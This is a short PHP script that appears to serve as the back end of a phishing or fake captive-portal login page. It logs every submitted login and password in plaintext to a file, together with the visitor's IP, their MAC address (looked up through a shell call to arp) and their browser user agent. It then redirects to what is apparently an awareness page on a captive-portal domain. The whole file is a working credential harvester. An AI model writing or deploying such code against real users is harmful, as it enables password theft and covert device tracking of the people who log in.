<?php
	$file = '../log.txt';
	$output=null;
	$retval=null;
	$ip = $_SERVER['REMOTE_ADDR'];
	exec("arp -a | grep $ip | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'", $output, $retval);
	$current_date = date("Y-m-d-H-i-s");
	$fileopen=(fopen("$file",'a'));
	fwrite($fileopen,$current_date);
	fwrite($fileopen," | IP : ");
	fwrite($fileopen,$_SERVER['REMOTE_ADDR']);
	fwrite($fileopen," | MAC : ");
	fwrite($fileopen,$output[0]);
	fwrite($fileopen," | Login : ");
	fwrite($fileopen,$_POST['login']);
	fwrite($fileopen," | Password : ");
	fwrite($fileopen,$_POST['password']);
	fwrite($fileopen," | Machine : ");
	fwrite($fileopen,$_SERVER['HTTP_USER_AGENT']);
	fwrite($fileopen,"\n");
	fclose($fileopen);
 ?><meta http-equiv='refresh' content='0; url=http://portail.captif-u.com/sensib.php' />
